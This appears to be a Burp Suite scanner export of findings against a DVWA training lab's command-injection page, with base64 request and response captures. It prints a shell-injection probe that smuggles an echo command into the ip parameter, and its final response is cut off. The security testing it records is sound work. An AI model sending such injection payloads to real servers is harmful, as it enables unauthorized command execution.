<?xml version="1.0"?>
<!DOCTYPE issues [
<!ELEMENT issues (issue*)>
<!ATTLIST issues burpVersion CDATA "">
<!ATTLIST issues exportTime CDATA "">
<!ELEMENT issue (serialNumber, type, name, host, path, location, severity, confidence, issueBackground?, remediationBackground?, references?, vulnerabilityClassifications?, issueDetail?, issueDetailItems?, remediationDetail?, requestresponse*, collaboratorEvent*, infiltratorEvent*, staticAnalysis*, dynamicAnalysis*, prototypePollution*)>
<!ELEMENT serialNumber (#PCDATA)>
<!ELEMENT type (#PCDATA)>
<!ELEMENT name (#PCDATA)>
<!ELEMENT host (#PCDATA)>
<!ATTLIST host ip CDATA "">
<!ELEMENT path (#PCDATA)>
<!ELEMENT location (#PCDATA)>
<!ELEMENT severity (#PCDATA)>
<!ELEMENT confidence (#PCDATA)>
<!ELEMENT issueBackground (#PCDATA)>
<!ELEMENT remediationBackground (#PCDATA)>
<!ELEMENT references (#PCDATA)>
<!ELEMENT vulnerabilityClassifications (#PCDATA)>
<!ELEMENT issueDetail (#PCDATA)>
<!ELEMENT issueDetailItems (issueDetailItem*)>
<!ELEMENT issueDetailItem (#PCDATA)>
<!ELEMENT remediationDetail (#PCDATA)>
<!ELEMENT requestresponse (request?, response?, responseRedirected?)>
<!ELEMENT request (#PCDATA)>
<!ATTLIST request method CDATA "">
<!ATTLIST request base64 (true|false) "false">
<!ELEMENT response (#PCDATA)>
<!ATTLIST response base64 (true|false) "false">
<!ELEMENT responseRedirected (#PCDATA)>
<!ELEMENT sender (#PCDATA)>
<!ELEMENT message (#PCDATA)>
<!ELEMENT conversation (#PCDATA)>
<!ELEMENT recipient (#PCDATA)>
<!ELEMENT recipients (recipient*)>
<!ELEMENT smtp (sender, recipients, message, conversation)>
<!ELEMENT collaboratorEvent (interactionType, originIp, time, lookupType?, lookupHost?, requestresponse?, smtp?)>
<!ELEMENT interactionType (#PCDATA)>
<!ELEMENT originIp (#PCDATA)>
<!ELEMENT time (#PCDATA)>
<!ELEMENT lookupType (#PCDATA)>
<!ELEMENT lookupHost (#PCDATA)>
<!ELEMENT infiltratorEvent (parameterName, platform, signature, stackTrace?, parameterValue?, collaboratorEvent)>
<!ELEMENT parameterName (#PCDATA)>
<!ELEMENT platform (#PCDATA)>
<!ELEMENT signature (#PCDATA)>
<!ELEMENT stackTrace (#PCDATA)>
<!ELEMENT parameterValue (#PCDATA)>
<!ELEMENT dynamicAnalysis (source, sink, sourceStackTrace, sinkStackTrace, eventListenerStackTrace, sourceValue, sinkValue, eventHandlerData, eventHandlerDataType, eventHandlerManipulatedData, poc, origin, isOriginChecked, sourceElementId, sourceElementName, eventFiredEventName, eventFiredElementId, eventFiredElementName, eventFiredOuterHtml)>
<!ELEMENT prototypePollution (poc, pollutionTechnique, pollutionType)>
<!ELEMENT staticAnalysis (source, sink, codeSnippets)>
<!ELEMENT source (#PCDATA)>
<!ELEMENT sink (#PCDATA)>
<!ELEMENT sourceStackTrace (#PCDATA)>
<!ELEMENT sinkStackTrace (#PCDATA)>
<!ELEMENT eventListenerStackTrace (#PCDATA)>
<!ELEMENT sourceValue (#PCDATA)>
<!ELEMENT sinkValue (#PCDATA)>
<!ELEMENT eventHandlerData (#PCDATA)>
<!ELEMENT eventHandlerDataType (#PCDATA)>
<!ELEMENT sourceElementId (#PCDATA)>
<!ELEMENT sourceElementName (#PCDATA)>
<!ELEMENT eventFiredEventName (#PCDATA)>
<!ELEMENT eventFiredElementId (#PCDATA)>
<!ELEMENT eventFiredElementName (#PCDATA)>
<!ELEMENT eventFiredOuterHtml (#PCDATA)>
<!ELEMENT eventHandlerManipulatedData (#PCDATA)>
<!ELEMENT poc (#PCDATA)>
<!ELEMENT origin (#PCDATA)>
<!ELEMENT isOriginChecked (#PCDATA)>
<!ELEMENT codeSnippets (codeSnippet*)>
<!ELEMENT codeSnippet (#PCDATA)>
<!ELEMENT pollutionTechnique (#PCDATA)>
<!ELEMENT pollutionType (#PCDATA)>
]>
<issues burpVersion="2023.8.1" exportTime="Wed Mar 20 19:28:50 GMT 2024">
  <issue>
    <serialNumber>7936049950181443584</serialNumber>
    <type>134217728</type>
    <name><![CDATA[Private IP addresses disclosed]]></name>
    <host ip="172.22.0.3">http://web</host>
    <path><![CDATA[/vulnerabilities/exec/]]></path>
    <location><![CDATA[/vulnerabilities/exec/]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>RFC 1918 specifies ranges of IP addresses that are reserved for use in private networks and cannot be routed on the public Internet. Although various methods exist by which an attacker can determine the public IP addresses in use by an organization, the private addresses used internally cannot usually be determined in the same ways.</p>
<p>Discovering the private addresses used within an organization can help an attacker in carrying out network-layer attacks aiming to penetrate the organization's internal infrastructure. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>There is not usually any good reason to disclose the internal IP addresses used within an organization's infrastructure. If these are being returned in service banners or debug messages, then the relevant services should be configured to mask the private addresses. If they are being used to track back-end servers for load balancing purposes, then the addresses should be rewritten with innocuous identifiers from which an attacker cannot infer any useful information about the infrastructure.</p>]]></remediationBackground>
    <issueDetail><![CDATA[The following RFC 1918 IP address was disclosed in the response:<ul><li>172.22.0.3</li></ul>]]></issueDetail>
    <issueDetailItems>
      <issueDetailItem><![CDATA[172.22.0.3]]></issueDetailItem>
    </issueDetailItems>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvdnVsbmVyYWJpbGl0aWVzL2V4ZWMvIEhUVFAvMS4wDQpIb3N0OiB3ZWINCkNvb2tpZTogc2VjdXJpdHk9aGlnaA0KQ29udGVudC1MZW5ndGg6IDIxDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KDQppcD1mdXp6JlN1Ym1pdD1TdWJtaXQ=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNDAwIEJhZCBSZXF1ZXN0DQpEYXRlOiBXZWQsIDIwIE1hciAyMDI0IDE5OjIzOjQ5IEdNVA0KU2VydmVyOiBBcGFjaGUvMi40LjU3IChEZWJpYW4pDQpDb250ZW50LUxlbmd0aDogMzAyDQpDb25uZWN0aW9uOiBjbG9zZQ0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9aXNvLTg4NTktMQ0KDQo8IURPQ1RZUEUgSFRNTCBQVUJMSUMgIi0vL0lFVEYvL0RURCBIVE1MIDIuMC8vRU4iPgo8aHRtbD48aGVhZD4KPHRpdGxlPjQwMCBCYWQgUmVxdWVzdDwvdGl0bGU+CjwvaGVhZD48Ym9keT4KPGgxPkJhZCBSZXF1ZXN0PC9oMT4KPHA+WW91ciBicm93c2VyIHNlbnQgYSByZXF1ZXN0IHRoYXQgdGhpcyBzZXJ2ZXIgY291bGQgbm90IHVuZGVyc3RhbmQuPGJyIC8+CjwvcD4KPGhyPgo8YWRkcmVzcz5BcGFjaGUvMi40LjU3IChEZWJpYW4pIFNlcnZlciBhdCAxNzIuMjIuMC4zIFBvcnQgODA8L2FkZHJlc3M+CjwvYm9keT48L2h0bWw+Cg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8262083047734166528</serialNumber>
    <type>134217728</type>
    <name><![CDATA[OS command injection]]></name>
    <host ip="172.22.0.3">http://web</host>
    <path><![CDATA[/vulnerabilities/exec/]]></path>
    <location><![CDATA[/vulnerabilities/exec/]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>Operating system command injection vulnerabilities arise when an application incorporates user-controllable data into a command that is processed by a shell command interpreter. If the user data is not strictly validated, an attacker can use shell metacharacters to modify the command that is executed, and inject arbitrary further commands that will be executed by the server.</p>
<p>OS command injection vulnerabilities are usually very serious and may lead to compromise of the server hosting the application, or of the application's own data and functionality. It may also be possible to use the server as a platform for attacks against other systems. The exact potential for exploitation depends upon the security context in which the command is executed, and the privileges that this context has regarding sensitive resources on the server.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>If possible, applications should avoid incorporating user-controllable data into operating system commands. In almost every situation, there are safer alternative methods of performing server-level tasks, which cannot be manipulated to perform additional commands than the one intended.</p>
<p>If it is considered unavoidable to incorporate user-supplied data into operating system commands, the following two layers of defense should be used to prevent attacks: </p>
<ul>
  <li>The user data should be strictly validated. Ideally, a whitelist of specific accepted values should be used. Otherwise, only short alphanumeric strings should be accepted. Input containing any other data, including any conceivable shell metacharacter or whitespace, should be rejected.</li>
  <li>The application should use command APIs that launch a specific process via its name and command-line parameters, rather than passing a command string to a shell interpreter that supports command chaining and redirection. For example, the Java API Runtime.exec and the ASP.NET API Process.Start do not support shell metacharacters. This defense can mitigate the impact of an attack even in the event that an attacker circumvents the input validation defenses.</li>
</ul>]]></remediationBackground>
    <issueDetail><![CDATA[The <b>ip</b> parameter appears to be vulnerable to OS command injection attacks. It is possible to use the pipe character (|) to inject arbitrary OS commands and retrieve the output in the application's responses.<br><br>The payload <b>|echo xyn8wi1hqw 9fm5931e43||a #' |echo xyn8wi1hqw 9fm5931e43||a #|" |echo xyn8wi1hqw 9fm5931e43||a #</b> was submitted in the ip parameter. The application's response appears to contain the output from the injected command, indicating that the command was executed.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvdnVsbmVyYWJpbGl0aWVzL2V4ZWMvIEhUVFAvMS4wDQpIb3N0OiB3ZWINCkNvb2tpZTogc2VjdXJpdHk9aGlnaA0KQ29udGVudC1MZW5ndGg6IDIxDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KDQppcD1mdXp6JTdjZWNobyUyMHh5bjh3aTFocXclMjA5Zm01OTMxZTQzJTdjJTdjYSUyMCUyMyclMjAlN2NlY2hvJTIweHluOHdpMWhxdyUyMDlmbTU5MzFlNDMlN2MlN2NhJTIwJTIzJTdjJTIyJTIwJTdjZWNobyUyMHh5bjh3aTFocXclMjA5Zm01OTMxZTQzJTdjJTdjYSUyMCUyMyZTdWJtaXQ9U3VibWl0]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBXZWQsIDIwIE1hciAyMDI0IDE5OjI0OjI2IEdNVA0KU2VydmVyOiBBcGFjaGUvMi40LjU3IChEZWJpYW4pDQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuMTANClNldC1Db29raWU6IFBIUFNFU1NJRD04ZGVtNGhlY2VnMzA5c3U0ZTdwa2IwZ3FqYTsgcGF0aD0vDQpFeHBpcmVzOiBUdWUsIDIzIEp1biAyMDA5IDEyOjAwOjAwIEdNVA0KQ2FjaGUtQ29udHJvbDogbm8tY2FjaGUsIG11c3QtcmV2YWxpZGF0ZQ0KUHJhZ21hOiBuby1jYWNoZQ0KVmFyeTogQWNjZXB0LUVuY29kaW5nDQpDb250ZW50LUxlbmd0aDogNDExMw0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sO2NoYXJzZXQ9dXRmLTgNCg0KCjwhRE9DVFlQRSBodG1sPgoKPGh0bWwgbGFuZz0iZW4tR0IiPgoKCTxoZWFkPgoJCTxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PVVURi04IiAvPgoKCQk8dGl0bGU+VnVsbmVyYWJpbGl0eTogQ29tbWFuZCBJbmplY3Rpb24gOjogRGFtbiBWdWxuZXJhYmxlIFdlYiBBcHBsaWNhdGlvbiAoRFZXQSkgdjEuMTAgKkRldmVsb3BtZW50KjwvdGl0bGU+CgoJCTxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii4uLy4uL2R2d2EvY3NzL21haW4uY3NzIiAvPgoKCQk8bGluayByZWw9Imljb24iIHR5cGU9IlxpbWFnZS9pY28iIGhyZWY9Ii4uLy4uL2Zhdmljb24uaWNvIiAvPgoKCQk8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSIuLi8uLi9kdndhL2pzL2R2d2FQYWdlLmpzIj48L3NjcmlwdD4KCgk8L2hlYWQ+CgoJPGJvZHkgY2xhc3M9ImhvbWUiPgoJCTxkaXYgaWQ9ImNvbnRhaW5lciI+CgoJCQk8ZGl2IGlkPSJoZWFkZXIiPgoKCQkJCTxpbWcgc3JjPSIuLi8uLi9kdndhL2ltYWdlcy9sb2dvLnBuZyIgYWx0PSJEYW1uIFZ1bG5lcmFibGUgV2ViIEFwcGxpY2F0aW9uIiAvPgoKCQkJPC9kaXY+CgoJCQk8ZGl2IGlkPSJtYWluX21lbnUiPgoKCQkJCTxkaXYgaWQ9Im1haW5fbWVudV9wYWRkZWQiPgoJCQkJPHVsIGNsYXNzPSJtZW51QmxvY2tzIj48bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vLiI+SG9tZTwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vaW5zdHJ1Y3Rpb25zLnBocCI+SW5zdHJ1Y3Rpb25zPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi9zZXR1cC5waHAiPlNldHVwIC8gUmVzZXQgREI8L2E+PC9saT4KPC91bD48dWwgY2xhc3M9Im1lbnVCbG9ja3MiPjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMvYnJ1dGUvIj5CcnV0ZSBGb3JjZTwvYT48L2xpPgo8bGkgY2xhc3M9InNlbGVjdGVkIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMvZXhlYy8iPkNvbW1hbmQgSW5qZWN0aW9uPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMvY3NyZi8iPkNTUkY8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy9maS8uP3BhZ2U9aW5jbHVkZS5waHAiPkZpbGUgSW5jbHVzaW9uPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMvdXBsb2FkLyI+RmlsZSBVcGxvYWQ8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy9jYXB0Y2hhLyI+SW5zZWN1cmUgQ0FQVENIQTwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL3NxbGkvIj5TUUwgSW5qZWN0aW9uPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMvc3FsaV9ibGluZC8iPlNRTCBJbmplY3Rpb24gKEJsaW5kKTwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL3dlYWtfaWQvIj5XZWFrIFNlc3Npb24gSURzPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMveHNzX2QvIj5YU1MgKERPTSk8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy94c3Nfci8iPlhTUyAoUmVmbGVjdGVkKTwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL3hzc19zLyI+WFNTIChTdG9yZWQpPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMvY3NwLyI+Q1NQIEJ5cGFzczwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL2phdmFzY3JpcHQvIj5KYXZhU2NyaXB0PC9hPjwvbGk+CjwvdWw+PHVsIGNsYXNzPSJtZW51QmxvY2tzIj48bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vc2VjdXJpdHkucGhwIj5EVldBIFNlY3VyaXR5PC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi9waHBpbmZvLnBocCI+UEhQIEluZm88L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL2Fib3V0LnBocCI+QWJvdXQ8L2E+PC9saT4KPC91bD48dWwgY2xhc3M9Im1lbnVCbG9ja3MiPjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi9sb2dvdXQucGhwIj5Mb2dvdXQ8L2E+PC9saT4KPC91bD4KCQkJCTwvZGl2PgoKCQkJPC9kaXY+CgoJCQk8ZGl2IGlkPSJtYWluX2JvZHkiPgoKCQkJCQ0KPGRpdiBjbGFzcz0iYm9keV9wYWRkZWQiPg0KCTxoMT5WdWxuZXJhYmlsaXR5OiBDb21tYW5kIEluamVjdGlvbjwvaDE+DQoNCgk8ZGl2IGNsYXNzPSJ2dWxuZXJhYmxlX2NvZGVfYXJlYSI+DQoJCTxoMj5QaW5nIGEgZGV2aWNlPC9oMj4NCg0KCQk8Zm9ybSBuYW1lPSJwaW5nIiBhY3Rpb249IiMiIG1ldGhvZD0icG9zdCI+DQoJCQk8cD4NCgkJCQlFbnRlciBhbiBJUCBhZGRyZXNzOg0KCQkJCTxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJpcCIgc2l6ZT0iMzAiPg0KCQkJCTxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9IlN1Ym1pdCIgdmFsdWU9IlN1Ym1pdCI+DQoJCQk8L3A+Cg0KCQk8L2Zvcm0+DQoJCTxwcmU+eHluOHdpMWhxdyA5Zm01OTMxZTQzYQo8L3ByZT4NCgk8L2Rpdj4NCg0KCTxoMj5Nb3JlIEluZm9ybWF0aW9uPC9oMj4NCgk8dWw+DQoJCTxsaT48YSBocmVmPSJodHRwczovL3d3dy5zY3JpYmQuY29tL2RvYy8yNTMwNDc2L1BocC1FbmRhbmdlcnMtUmVtb3RlLUNvZGUtRXhlY3V0aW9uIiB0YXJnZXQ9Il9ibGFuayI+aHR0cHM6Ly93d3cuc2NyaWJkLmNvbS9kb2MvMjUzMDQ3Ni9QaHAtRW5kYW5nZXJzLVJlbW90ZS1Db2RlLUV4ZWN1dGlvbjwvYT48L2xpPg0KCQk8bGk+PGEgaHJlZj0iaHR0cDovL3d3dy5zczY0LmNvbS9iYXNoLyIgdGFyZ2V0PSJfYmxhbmsiPmh0dHA6Ly93d3cuc3M2NC5jb20vYmFzaC88L2E+PC9saT4NCgkJPGxpPjxhIGhyZWY9Imh0dHA6Ly93d3cuc3M2NC5jb20vbnQvIiB0YXJnZXQ9Il9ibGFuayI+aHR0cDovL3d3dy5zczY0LmNvbS9udC88L2E+PC9saT4NCgkJPGxpPjxhIGhyZWY9Imh0dHBzOi8vb3dhc3Aub3JnL3d3dy1jb21tdW5pdHkvYXR0YWNrcy9Db21tYW5kX0luamVjdGlvbiIgdGFyZ2V0PSJfYmxhbmsiPmh0dHBzOi8vb3dhc3Aub3JnL3d3dy1jb21tdW5pdHkvYXR0YWNrcy9Db21tYW5kX0luamVjdGlvbjwvYT48L2xpPg0KCTwvdWw+DQo8L2Rpdj4KCgkJCQk8YnIgLz48YnIgLz4KCQkJCQoKCQkJPC9kaXY+CgoJCQk8ZGl2IGNsYXNzPSJjbGVhciI+CgkJCTwvZGl2PgoKCQkJPGRpdiBpZD0ic3lzdGVtX2luZm8iPgoJCQkJPGlucHV0IHR5cGU9ImJ1dHRvbiIgdmFsdWU9IlZpZXcgSGVscCIgY2xhc3M9InBvcHVwX2J1dHRvbiIgaWQ9J2hlbHBfYnV0dG9uJyBkYXRhLWhlbHAtdXJsPScuLi8uLi92dWxuZXJhYmlsaXRpZXMvdmlld19oZWxwLnBocD9pZD1leGVjJnNlY3VyaXR5PWhpZ2gmbG9jYWxlPWVuJyApIj4gPGlucHV0IHR5cGU9ImJ1dHRvbiIgdmFsdWU9IlZpZXcgU291cmNlIiBjbGFzcz0icG9wdXBfYnV0dG9uIiBpZD0nc291cmNlX2J1dHRvbicgZGF0YS1zb3VyY2UtdXJsPScuLi8uLi92dWxuZXJhYmlsaXRpZXMvdmlld19zb3VyY2UucGhwP2lkPWV4ZWMmc2VjdXJpdHk9aGlnaCcgKSI+IDxkaXYgYWxpZ249ImxlZnQiPjxlbT5Vc2VybmFtZTo8L2VtPiBhZG1pbjxiciAvPjxlbT5TZWN1cml0eSBMZXZlbDo8L2VtPiBoaWdoPGJyIC8+PGVtPkxvY2FsZTo8L2VtPiBlbjxiciAvPjxlbT5QSFBJRFM6PC9lbT4gZGlzYWJsZWQ8YnIgLz48ZW0+U1FMaSBEQjo8L2VtPiBteXNxbDwvZGl2PgoJCQk8L2Rpdj4KCgkJCTxkaXYgaWQ9ImZvb3RlciI+CgoJCQkJPHA+RGFtbiBWdWxuZXJhYmxlIFdlYiBBcHBsaWNhdGlvbiAoRFZXQSkgdjEuMTAgKkRldmVsb3BtZW50KjwvcD4KCQkJCTxzY3JpcHQgc3JjPScuLi8uLi8vZHZ3YS9qcy9hZGRfZXZlbnRfbGlzdGVuZXJzLmpzJz48L3NjcmlwdD4KCgkJCTwvZGl2PgoKCQk8L2Rpdj4KCgk8L2JvZHk+Cgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>1222414119106967552</serialNumber>
    <type>134217728</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="172.22.0.3">http://web</host>
    <path><![CDATA[/vulnerabilities/exec/]]></path>
    <location><![CDATA[/vulnerabilities/exec/]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <issueDetail><![CDATA[The value of the <b>security</b> cookie is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvdnVsbmVyYWJpbGl0aWVzL2V4ZWMvIEhUVFAvMS4wDQpIb3N0OiB3ZWINCkNvb2tpZTogc2VjdXJpdHk9aGlnaDc5Y2JvZGVmYjUNCkNvbnRlbnQtTGVuZ3RoOiAyMQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCg0KaXA9ZnV6eiZTdWJtaXQ9U3VibWl0]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBXZWQsIDIwIE1hciAyMDI0IDE5OjI0OjMzIEdNVA0KU2VydmVyOiBBcGFjaGUvMi40LjU3IChEZWJpYW4pDQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuMTANClNldC1Db29raWU6IFBIUFNFU1NJRD1wZ2RzNmlnY2Rzc3BwN2pnZnZkb2locThxcjsgcGF0aD0vDQpFeHBpcmVzOiBUdWUsIDIzIEp1biAyMDA5IDEyOjAwOjAwIEdNVA0KQ2FjaGUtQ29udHJvbDogbm8tY2FjaGUsIG11c3QtcmV2YWxpZGF0ZQ0KUHJhZ21hOiBuby1jYWNoZQ0KU2V0LUNvb2tpZTogUEhQU0VTU0lEPXBnZHM2aWdjZHNzcHA3amdmdmRvaWhxOHFyOyBwYXRoPS87IEh0dHBPbmx5DQpTZXQtQ29va2llOiBzZWN1cml0eT1pbXBvc3NpYmxlOyBwYXRoPS87IEh0dHBPbmx5DQpWYXJ5OiBBY2NlcHQtRW5jb2RpbmcNCkNvbnRlbnQtTGVuZ3RoOiA0MjM5DQpDb25uZWN0aW9uOiBjbG9zZQ0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD11dGYtOA0KDQoKPCFET0NUWVBFIGh0bWw+Cgo8aHRtbCBsYW5nPSJlbi1HQiI+CgoJPGhlYWQ+CgkJPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9VVRGLTgiIC8+CgoJCTx0aXRsZT5WdWxuZXJhYmlsaXR5OiBDb21tYW5kIEluamVjdGlvbiA6OiBEYW1uIFZ1bG5lcmFibGUgV2ViIEFwcGxpY2F0aW9uIChEVldBKSB2MS4xMCAqRGV2ZWxvcG1lbnQqPC90aXRsZT4KCgkJPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgaHJlZj0iLi4vLi4vZHZ3YS9jc3MvbWFpbi5jc3MiIC8+CgoJCTxsaW5rIHJlbD0iaWNvbiIgdHlwZT0iXGltYWdlL2ljbyIgaHJlZj0iLi4vLi4vZmF2aWNvbi5pY28iIC8+CgoJCTxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9Ii4uLy4uL2R2d2EvanMvZHZ3YVBhZ2UuanMiPjwvc2NyaXB0PgoKCTwvaGVhZD4KCgk8Ym9keSBjbGFzcz0iaG9tZSI+CgkJPGRpdiBpZD0iY29udGFpbmVyIj4KCgkJCTxkaXYgaWQ9ImhlYWRlciI+CgoJCQkJPGltZyBzcmM9Ii4uLy4uL2R2d2EvaW1hZ2VzL2xvZ28ucG5nIiBhbHQ9IkRhbW4gVnVsbmVyYWJsZSBXZWIgQXBwbGljYXRpb24iIC8+CgoJCQk8L2Rpdj4KCgkJCTxkaXYgaWQ9Im1haW5fbWVudSI+CgoJCQkJPGRpdiBpZD0ibWFpbl9tZW51X3BhZGRlZCI+CgkJCQk8dWwgY2xhc3M9Im1lbnVCbG9ja3MiPjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi8uIj5Ib21lPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi9pbnN0cnVjdGlvbnMucGhwIj5JbnN0cnVjdGlvbnM8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3NldHVwLnBocCI+U2V0dXAgLyBSZXNldCBEQjwvYT48L2xpPgo8L3VsPjx1bCBjbGFzcz0ibWVudUJsb2NrcyI+PGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy9icnV0ZS8iPkJydXRlIEZvcmNlPC9hPjwvbGk+CjxsaSBjbGFzcz0ic2VsZWN0ZWQiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy9leGVjLyI+Q29tbWFuZCBJbmplY3Rpb248L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy9jc3JmLyI+Q1NSRjwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL2ZpLy4/cGFnZT1pbmNsdWRlLnBocCI+RmlsZSBJbmNsdXNpb248L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy91cGxvYWQvIj5GaWxlIFVwbG9hZDwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL2NhcHRjaGEvIj5JbnNlY3VyZSBDQVBUQ0hBPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMvc3FsaS8iPlNRTCBJbmplY3Rpb248L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy9zcWxpX2JsaW5kLyI+U1FMIEluamVjdGlvbiAoQmxpbmQpPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMvd2Vha19pZC8iPldlYWsgU2Vzc2lvbiBJRHM8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy94c3NfZC8iPlhTUyAoRE9NKTwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL3hzc19yLyI+WFNTIChSZWZsZWN0ZWQpPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMveHNzX3MvIj5YU1MgKFN0b3JlZCk8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy9jc3AvIj5DU1AgQnlwYXNzPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMvamF2YXNjcmlwdC8iPkphdmFTY3JpcHQ8L2E+PC9saT4KPC91bD